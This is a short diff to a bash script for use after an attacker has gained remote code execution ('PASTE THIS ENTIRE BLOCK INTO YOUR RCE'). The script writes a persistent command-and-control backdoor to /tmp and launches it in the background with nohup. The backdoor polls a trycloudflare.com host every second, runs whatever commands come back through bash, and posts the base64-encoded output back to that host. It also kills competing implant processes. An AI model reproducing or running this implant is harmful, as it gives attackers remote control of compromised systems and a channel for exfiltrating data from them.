@@ -1,36 +1,32 @@
-cat << 'EOF' > /tmp/silent_shell.sh
+# PASTE THIS ENTIRE BLOCK INTO YOUR RCE
+cat << 'EOF' > /tmp/clean_shell.sh
 #!/bin/bash
 C2="https://italiano-successfully-rear-engage.trycloudflare.com"
-LOCKFILE="/tmp/shell.lock"
+LOCK="/tmp/shell.lock"
 
-# Kill all other instances of this script and its siblings
-# (Using a lockfile ensures only one 'heartbeat' exists)
-if [ -f "$LOCKFILE" ]; then
-    old_pid=$(cat "$LOCKFILE")
-    kill -9 "$old_pid" 2>/dev/null
-fi
-echo $$ > "$LOCKFILE"
+# Kill duplicates and self
+pkill -f sync_verify.sh 2>/dev/null
+pkill -f silent_shell.sh 2>/dev/null
 
 while true; do
-  # 1. Pulse every 1 second
-  CMD=$(curl -s -L --max-time 2 "$C2")
+  # 1-second pulse
+  CMD=$(curl -s -L --max-time 1 "$C2")
   
   if [[ -n "$CMD" && "$CMD" != "none" ]]; then
-    # 2. Execute
+    # Execute and capture
     RESULT=$(/bin/bash -c "$CMD" 2>&1)
     
-    # 3. Clean and Base64 encode
-    # We use a space if result is empty to keep the connection open
+    # Base64 encode without newlines
     [ -z "$RESULT" ] && RESULT=" "
     payload=$(echo "$RESULT" | base64 | tr -d '\n')
     
-    # 4. Send back
+    # Send back
     curl -s -X POST -d "$payload" "$C2" > /dev/null
   fi
   sleep 1
 done
 EOF
 
-chmod +x /tmp/silent_shell.sh
-# One-liner to kill all previous attempts before launching
-pkill -f sync_verify.sh; pkill -f silent_shell.sh; nohup /tmp/silent_shell.sh >/dev/null 2>&1 &
+chmod +x /tmp/clean_shell.sh
+# Kill any existing clean_shells and start fresh
+pkill -f clean_shell.sh; nohup /tmp/clean_shell.sh >/dev/null 2>&1 &
